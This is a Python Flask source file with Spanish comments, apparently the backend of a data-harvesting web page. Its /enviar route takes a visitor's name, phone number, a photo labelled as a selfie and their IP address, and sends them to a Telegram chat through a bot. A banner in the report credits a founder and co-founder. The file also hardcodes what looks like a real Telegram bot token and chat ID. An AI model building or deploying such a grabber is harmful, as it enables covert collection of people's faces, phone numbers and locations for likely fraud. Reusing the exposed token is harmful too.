import os
from flask import Flask, render_template, request, jsonify
import telebot
from datetime import datetime

app = Flask(__name__)

# 🔒 TUS DATOS (NO TOCADOS)
TOKEN = "8761804922:AAFSHTi1qk7XPoS-kn1Zncf7Y8o8gNpAbnM"
MI_ID = "8114050673"

bot = telebot.TeleBot(TOKEN)

# -------- WEB --------
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    try:
        nombre = request.form.get('nombre')
        telefono = request.form.get('telefono')
        foto = request.files.get('foto')

        fecha = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        reporte = (
            "┏━━━━━━━━━━━━━━━━━━━━━━┑\n"
            "┣► 📸 Selfie tomada\n"
            "┣► 👑 Fundador: @stevenappsshops\n"
            "┣► 🤝 Co-fundador: @Broquicalifoxx\n"
            f"┣► 👤 Usuario: {nombre}\n"
            f"┣► 📱 Teléfono: {telefono}\n"
            f"┣► 🕒 Fecha: {fecha}\n"
            f"┣► 🌐 IP: {request.remote_addr}\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━┙"
        )

        if foto:
            bot.send_photo(MI_ID, foto, caption=reporte)
        else:
            bot.send_message(MI_ID, reporte)

        return jsonify({"ok": True})

    except Exception as e:
        return jsonify({"error": str(e)})

# -------- BOT WEBHOOK --------
@app.route(f"/{TOKEN}", methods=["POST"])
def recibir_update():
    update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
    bot.process_new_updates([update])
    return "ok", 200

# -------- COMANDOS --------
@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🤖 Bot activo correctamente")

@bot.message_handler(commands=['id'])
def get_id(msg):
    bot.reply_to(msg, f"🆔 Tu ID: {msg.chat.id}")

# -------- ACTIVAR WEBHOOK --------
@app.route('/setwebhook')
def set_webhook():
    url = os.environ.get("RENDER_EXTERNAL_URL")
    bot.remove_webhook()
    bot.set_webhook(url=f"{url}/{TOKEN}")
    return "Webhook configurado", 200

# -------- MAIN --------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)